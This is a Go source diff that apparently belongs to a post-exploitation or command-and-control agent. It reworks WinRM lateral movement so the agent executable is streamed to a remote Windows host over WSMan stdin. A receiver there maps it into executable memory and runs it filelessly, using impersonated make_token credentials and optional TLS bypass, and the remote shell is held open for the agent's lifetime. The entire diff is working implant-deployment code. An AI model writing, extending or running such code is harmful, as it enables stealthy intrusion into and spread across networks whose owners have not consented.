@@ -5,7 +5,9 @@ package main
 import (
 	"errors"
 	"fmt"
+	"io"
 	"net"
+	"os"
 	"runtime"
 	"strings"
 	"sync"
@@ -49,7 +51,7 @@ func loadWSMan() (wsmanNative, error) {
 		"WSManInitialize", "WSManDeinitialize", "WSManCreateSession", "WSManCloseSession",
 		"WSManCreateShell", "WSManCloseShell", "WSManRunShellCommand", "WSManCloseCommand",
 		"WSManReceiveShellOutput", "WSManCloseOperation",
-		"WSManSetSessionOption",
+		"WSManSetSessionOption", "WSManSendShellInput",
 	} {
 		proc := dll.NewProc(name)
 		if err := proc.Find(); err != nil {
@@ -114,6 +116,7 @@ type wsmanResult struct {
 	err         error
 	commandDone bool
 	exitCode    uint32
+	output      string
 }
 type wsmanPending struct {
 	async  wsmanShellAsync
@@ -171,6 +174,15 @@ func wsmanCompletion(context, flags, errPtr, shell, command, operation, data uin
 	}
 	if result.err == nil && result.receive && data != 0 {
 		receive := (*wsmanReceiveData)(unsafe.Pointer(data))
+		// Retain only a bounded ownership acknowledgment, never file contents.
+		stream := receive.streamData
+		if readWSManString(uintptr(unsafe.Pointer(receive.streamID))) == "stdout" && stream.kind == 2 && stream.value != 0 && stream.length != 0 && len(result.output) < 4096 {
+			length := int(stream.length)
+			if length > 4096-len(result.output) {
+				length = 4096 - len(result.output)
+			}
+			result.output += string(unsafe.Slice((*byte)(unsafe.Pointer(stream.value)), length))
+		}
 		if strings.HasSuffix(readWSManString(uintptr(unsafe.Pointer(receive.commandState))), wsmanCommandStateDone) {
 			result.commandDone = true
 			result.exitCode = receive.exitCode
@@ -242,9 +254,21 @@ func (s *wsmanScope) closeHandle(native wsmanCaller, name string, handle uintptr
 	return nil
 }
 
-// winrmCreateProcess uses selected explicit credentials when make_token is
-// active, otherwise thread defaults. Detach must finish before the shell closes.
-func winrmCreateProcess(host, agentPath, sessionID string, workspaceID *string, serviceName string, identity *winrmCredentials, useHTTPS, insecure bool) error {
+// winrmDeployAgent streams the local executable through WSMan and starts it
+// in memory inside the receiver, using the same authentication and TLS
+// policy for transfer and launch. The receiver maps the received bytes into
+// a PAGE_EXECUTE_READWRITE allocation and starts the agent on a detached
+// thread; the WinRM shell must then stay open for the agent's lifetime.
+func winrmDeployAgent(host, sourcePath, sessionID string, workspaceID *string, identity *winrmCredentials, useHTTPS, insecure bool) error {
+	source, err := os.Open(sourcePath)
+	if err != nil {
+		return fmt.Errorf("open local agent for WinRM: %w", err)
+	}
+	defer source.Close()
+	transfer, err := prepareWinRMTransfer(source)
+	if err != nil {
+		return fmt.Errorf("prepare WinRM transfer: %w", err)
+	}
 	// Initialize the shared COM security policy before WSMan can initialize
 	// it implicitly, so a later WMI command can use thread-token cloaking.
 	runtime.LockOSThread()
@@ -260,35 +284,84 @@ func winrmCreateProcess(host, agentPath, sessionID string, workspaceID *string, 
 	if err != nil {
 		return err
 	}
-	return winrmCreateProcessWithTLSAPI(native, host, agentPath, sessionID, workspaceID, serviceName, wsmanCompletionTimeout, identity, useHTTPS, insecure)
+	return winrmExecuteWithTLSAPI(native, host, winrmReceiverCommandPath,
+		winrmReceiverArguments(sessionID, workspaceID, transfer),
+		wsmanCompletionTimeout, identity, useHTTPS, insecure, transfer, true)
 }
 
-func winrmCreateProcessWithAPI(native wsmanCaller, host, agentPath, sessionID string, workspaceID *string, serviceName string, timeout time.Duration) (resultErr error) {
-	return winrmCreateProcessWithIdentityAPI(native, host, agentPath, sessionID, workspaceID, serviceName, timeout, nil)
+func winrmCreateProcessWithAPI(native wsmanCaller, host, commandPath string, arguments []string, timeout time.Duration) (resultErr error) {
+	return winrmCreateProcessWithIdentityAPI(native, host, commandPath, arguments, timeout, nil)
 }
 
 // winrmCreateProcessWithIdentityAPI supplies selected make_token credentials
 // explicitly to WSMan; an absent identity retains default thread credentials.
-func winrmCreateProcessWithIdentityAPI(native wsmanCaller, host, agentPath, sessionID string, workspaceID *string, serviceName string, timeout time.Duration, identity *winrmCredentials) (resultErr error) {
-	return winrmCreateProcessWithTransportAPI(native, host, agentPath, sessionID, workspaceID, serviceName, timeout, identity, false)
+func winrmCreateProcessWithIdentityAPI(native wsmanCaller, host, commandPath string, arguments []string, timeout time.Duration, identity *winrmCredentials) (resultErr error) {
+	return winrmCreateProcessWithTransportAPI(native, host, commandPath, arguments, timeout, identity, false)
 }
 
 // winrmCreateProcessWithTransportAPI selects HTTP/5985 or HTTPS/5986 while
 // leaving native server-certificate and authentication validation enabled.
-func winrmCreateProcessWithTransportAPI(native wsmanCaller, host, agentPath, sessionID string, workspaceID *string, serviceName string, timeout time.Duration, identity *winrmCredentials, useHTTPS bool) (resultErr error) {
-	return winrmCreateProcessWithTLSAPI(native, host, agentPath, sessionID, workspaceID, serviceName, timeout, identity, useHTTPS, false)
+func winrmCreateProcessWithTransportAPI(native wsmanCaller, host, commandPath string, arguments []string, timeout time.Duration, identity *winrmCredentials, useHTTPS bool) (resultErr error) {
+	return winrmCreateProcessWithTLSAPI(native, host, commandPath, arguments, timeout, identity, useHTTPS, false)
 }
 
 // winrmCreateProcessWithTLSAPI scopes optional certificate bypass to this
 // HTTPS session. It never changes machine certificate stores or TrustedHosts.
-func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, agentPath, sessionID string, workspaceID *string, serviceName string, timeout time.Duration, identity *winrmCredentials, useHTTPS, insecure bool) (resultErr error) {
+func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, commandPath string, arguments []string, timeout time.Duration, identity *winrmCredentials, useHTTPS, insecure bool) (resultErr error) {
+	return winrmExecuteWithTLSAPI(native, host, commandPath, arguments, timeout, identity, useHTTPS, insecure, nil, false)
+}
+
+// winrmHeldShell records one live in-memory deployment: the receiver command
+// never completes, so its WinRM command, shell, session, and API handles
+// must outlive the lateral worker that created them.
+type winrmHeldShell struct {
+	native              wsmanCaller
+	api, session, shell uintptr
+	command             uintptr
+}
+
+var winrmHeldShells = struct {
+	sync.Mutex
+	shells []*winrmHeldShell
+}{}
+
+// holdWinRMShell keeps a completed transfer's native handles open; closing
+// them would terminate the receiver process tree and the in-memory agent.
+func holdWinRMShell(deployment *winrmHeldShell) {
+	winrmHeldShells.Lock()
+	defer winrmHeldShells.Unlock()
+	winrmHeldShells.shells = append(winrmHeldShells.shells, deployment)
+}
+
+// stopHeldWinRMShells closes every shell held open for an in-memory WinRM
+// deployment. It runs at agent shutdown: the deployed sessions die with
+// their source agent by design.
+func stopHeldWinRMShells() {
+	winrmHeldShells.Lock()
+	shells := winrmHeldShells.shells
+	winrmHeldShells.shells = nil
+	winrmHeldShells.Unlock()
+	for _, deployment := range shells {
+		scope := &wsmanScope{}
+		_ = scope.closeHandle(deployment.native, "WSManCloseCommand", deployment.command, wsmanCompletionTimeout)
+		_ = scope.closeHandle(deployment.native, "WSManCloseShell", deployment.shell, wsmanCompletionTimeout)
+		_ = scope.closeHandle(deployment.native, "WSManCloseSession", deployment.session, wsmanCompletionTimeout)
+		if code := deployment.native.call("WSManDeinitialize", deployment.api, 0); code != 0 {
+			debugEvent("winrm.held.deinitialize.failed", fmt.Errorf("WSManDeinitialize failed: 0x%08x", code))
+		}
+		scope.release()
+	}
+}
+
+// winrmExecuteWithTLSAPI shares the session policy between process-only ABI
+// fixtures and the production transfer-and-hold path. When hold is set, a
+// successful transfer moves the native handles into the held-shell registry
+// instead of tearing the session down: the receiver never completes.
+func winrmExecuteWithTLSAPI(native wsmanCaller, host, commandPath string, arguments []string, timeout time.Duration, identity *winrmCredentials, useHTTPS, insecure bool, transfer *winrmTransfer, hold bool) (resultErr error) {
 	if insecure && !useHTTPS {
 		return errors.New("insecure requires winrm HTTPS")
 	}
-	arguments, err := lateralDetachArguments(sessionID, workspaceID, serviceName)
-	if err != nil {
-		return err
-	}
+	held := false
 	scope := &wsmanScope{}
 	defer scope.release()
 	// Roots outlive deferred CloseSession/Deinitialize, which drain callbacks.
@@ -348,7 +421,7 @@ func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, agentPath, sessionID
 	if err != nil {
 		return err
 	}
-	commandLine, err := utf16(agentPath)
+	commandLine, err := utf16(commandPath)
 	if err != nil {
 		return err
 	}
@@ -362,16 +435,17 @@ func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, agentPath, sessionID
 	scope.keep(argumentPointers)
 	argumentSet := &wsmanStringSet{count: uint32(len(argumentPointers)), values: &argumentPointers[0]}
 	scope.keep(argumentSet)
-	var api, session, shell, command, receiveOperation uintptr
+	var api, session, shell uintptr
 	scope.keep(&api)
 	scope.keep(&session)
 	scope.keep(&shell)
-	scope.keep(&command)
-	scope.keep(&receiveOperation)
 	if code := native.call("WSManInitialize", 0, uintptr(unsafe.Pointer(&api))); code != 0 {
 		return fmt.Errorf("WSManInitialize failed: 0x%08x", code)
 	}
 	defer func() {
+		if held {
+			return
+		}
 		if code := native.call("WSManDeinitialize", api, 0); code != 0 {
 			resultErr = errors.Join(resultErr, fmt.Errorf("WSManDeinitialize failed: 0x%08x", code))
 		}
@@ -386,6 +460,9 @@ func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, agentPath, sessionID
 		return fmt.Errorf("WSManCreateSession(%s) failed: 0x%08x", host, code)
 	}
 	defer func() {
+		if held {
+			return
+		}
 		if code := native.call("WSManCloseSession", session, 0); code != 0 {
 			resultErr = errors.Join(resultErr, fmt.Errorf("WSManCloseSession failed: 0x%08x", code))
 		}
@@ -415,6 +492,9 @@ func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, agentPath, sessionID
 	native.call("WSManCreateShell", session, 0, uintptr(unsafe.Pointer(uri)), 0, 0, 0,
 		uintptr(unsafe.Pointer(&shellCall.async)), uintptr(unsafe.Pointer(&shell)))
 	defer func() {
+		if held {
+			return
+		}
 		resultErr = errors.Join(resultErr, scope.closeHandle(native, "WSManCloseShell", shell, timeout))
 	}()
 	if !shellCall.result.wait(timeout) {
@@ -439,57 +519,126 @@ func winrmCreateProcessWithTLSAPI(native wsmanCaller, host, agentPath, sessionID
 	if shell == 0 {
 		return errors.New("WSManCreateShell returned no shell handle")
 	}
-	commandCall := scope.pendingCall(false)
-	native.call("WSManRunShellCommand", shell, 0, uintptr(unsafe.Pointer(commandLine)), uintptr(unsafe.Pointer(argumentSet)), 0,
-		uintptr(unsafe.Pointer(&commandCall.async)), uintptr(unsafe.Pointer(&command)))
+	deployment := &winrmHeldShell{native: native, api: api, session: session, shell: shell}
+	held, resultErr = scope.runCommand(native, shell, commandLine, argumentSet, host, timeout, transfer, hold, deployment)
+	if held {
+		holdWinRMShell(deployment)
+	}
+	return resultErr
+}
+
+// runCommand keeps all asynchronous arguments rooted until session teardown.
+// A held deployment returns true after the transfer completes so the caller
+// can keep the native handles open; failed transfers tear down normally.
+func (scope *wsmanScope) runCommand(native wsmanCaller, shell uintptr, commandLine *uint16, argumentSet *wsmanStringSet, host string, timeout time.Duration, transfer *winrmTransfer, hold bool, deployment *winrmHeldShell) (held bool, resultErr error) {
+	var command, receiveOperation uintptr
+	scope.keep(&command)
+	scope.keep(&receiveOperation)
+	var receiveCall *wsmanPending
 	defer func() {
-		resultErr = errors.Join(resultErr, scope.closeHandle(native, "WSManCloseCommand", command, timeout))
-	}()
-	if !commandCall.result.wait(timeout) {
-		return errors.New("WinRM command creation timed out")
-	}
-	if err, _, _ := commandCall.result.snapshot(); err != nil {
-		return fmt.Errorf("WinRM command on %s: %w", host, err)
-	}
-	if command == 0 {
-		return errors.New("WSManRunShellCommand returned no command handle")
-	}
-	receiveCall := scope.pendingCall(true)
-	// NULL requests all output streams. One receive produces multiple callbacks.
-	native.call("WSManReceiveShellOutput", shell, command, 0, 0, uintptr(unsafe.Pointer(&receiveCall.async)), uintptr(unsafe.Pointer(&receiveOperation)))
-	defer func() {
+		if held {
+			return
+		}
 		if receiveOperation != 0 {
 			if code := native.call("WSManCloseOperation", receiveOperation, 0); code != 0 {
 				resultErr = errors.Join(resultErr, fmt.Errorf("WSManCloseOperation failed: 0x%08x", code))
 			}
 		}
+		resultErr = errors.Join(resultErr, scope.closeHandle(native, "WSManCloseCommand", command, timeout))
 	}()
+	commandCall := scope.pendingCall(false)
+	native.call("WSManRunShellCommand", shell, 0, uintptr(unsafe.Pointer(commandLine)), uintptr(unsafe.Pointer(argumentSet)), 0,
+		uintptr(unsafe.Pointer(&commandCall.async)), uintptr(unsafe.Pointer(&command)))
+	if !commandCall.result.wait(timeout) {
+		return false, errors.New("WinRM command creation timed out")
+	}
+	if err, _, _ := commandCall.result.snapshot(); err != nil {
+		return false, fmt.Errorf("WinRM command on %s: %w", host, err)
+	}
+	if command == 0 {
+		return false, errors.New("WSManRunShellCommand returned no command handle")
+	}
+	if hold {
+		// The receiver maps the agent in memory and never completes; there
+		// is no command result to receive. The shell stays open in the
+		// held-shell registry once the last input packet is acknowledged.
+		if err := scope.sendInput(native, shell, command, transfer, timeout); err != nil {
+			return false, err
+		}
+		deployment.command = command
+		return true, nil
+	}
+	receiveCall = scope.pendingCall(true)
+	// NULL requests all output streams. One receive produces multiple callbacks.
+	native.call("WSManReceiveShellOutput", shell, command, 0, 0, uintptr(unsafe.Pointer(&receiveCall.async)), uintptr(unsafe.Pointer(&receiveOperation)))
+	if transfer != nil {
+		if err := scope.sendInput(native, shell, command, transfer, timeout); err != nil {
+			return false, err
+		}
+	}
 	if !receiveCall.result.wait(2 * timeout) {
-		return errors.New("WinRM detach completion not confirmed before timeout")
+		return false, errors.New("WinRM detach completion not confirmed before timeout")
 	}
 	if err, done, exitCode := receiveCall.result.snapshot(); err != nil {
-		return fmt.Errorf("WinRM receive on %s: %w", host, err)
+		return false, fmt.Errorf("WinRM receive on %s: %w", host, err)
 	} else if !done {
-		return errors.New("WinRM receive ended without command completion")
+		return false, errors.New("WinRM receive ended without command completion")
 	} else if exitCode != 0 {
-		return fmt.Errorf("WinRM detach command exited with %d", exitCode)
+		return false, fmt.Errorf("WinRM detach command exited with %d", exitCode)
 	}
-	return nil
+	return false, nil
 }
 
-// lateralDetachArguments builds the remote command arguments: the detach
-// flag followed by the standard lateral startup arguments.
-func lateralDetachArguments(sessionID string, workspaceID *string, serviceName string) ([]string, error) {
-	args := []string{"--lateral-detach", "--lateral-session", sessionID}
-	if workspaceID != nil {
-		value := *workspaceID
-		if value == "" {
-			value = "-"
+// sendInput sends bounded binary WSMan stdin packets and an explicit EOF.
+// Pending buffers remain alive through operation cancellation and session drain.
+func (scope *wsmanScope) sendInput(native wsmanCaller, shell, command uintptr, transfer *winrmTransfer, timeout time.Duration) error {
+	stdin, _ := syscall.UTF16PtrFromString("stdin")
+	scope.keep(stdin)
+	source := io.LimitReader(transfer.source, transfer.size+1)
+	var total int64
+	for {
+		buffer := make([]byte, winrmTransferChunkSize)
+		n, readErr := source.Read(buffer)
+		if readErr != nil && readErr != io.EOF {
+			return fmt.Errorf("read local WinRM agent: %w", readErr)
 		}
-		args = append(args, "--workspace-id", value)
+		total += int64(n)
+		if total > transfer.size || (readErr == io.EOF && total != transfer.size) {
+			return errors.New("WinRM local agent length changed during transfer")
+		}
+		if n == 0 && readErr == nil {
+			return errors.New("WinRM local agent reader made no progress")
+		}
+		data := &wsmanData{kind: 2, length: uint32(n)}
+		if n > 0 {
+			data.value = uintptr(unsafe.Pointer(&buffer[0]))
+		}
+		scope.keep(buffer)
+		scope.keep(data)
+		pending := scope.pendingCall(false)
+		operation := new(uintptr)
+		scope.keep(operation)
+		var eof uintptr
+		if readErr == io.EOF {
+			eof = 1
+		}
+		native.call("WSManSendShellInput", shell, command, 0, uintptr(unsafe.Pointer(stdin)), uintptr(unsafe.Pointer(data)), eof,
+			uintptr(unsafe.Pointer(&pending.async)), uintptr(unsafe.Pointer(operation)))
+		completed := pending.result.wait(timeout)
+		var closeErr error
+		if *operation != 0 {
+			if code := native.call("WSManCloseOperation", *operation, 0); code != 0 {
+				closeErr = fmt.Errorf("close WinRM input operation: 0x%08x", code)
+			}
+		}
+		if !completed {
+			return errors.Join(errors.New("WinRM agent input timed out"), closeErr)
+		}
+		if err, _, _ := pending.result.snapshot(); err != nil || closeErr != nil {
+			return errors.Join(fmt.Errorf("WinRM agent input failed"), err, closeErr)
+		}
+		if eof != 0 {
+			return nil
+		}
 	}
-	if serviceName != "" {
-		args = append(args, "--service-name", serviceName)
-	}
-	return args, nil
 }
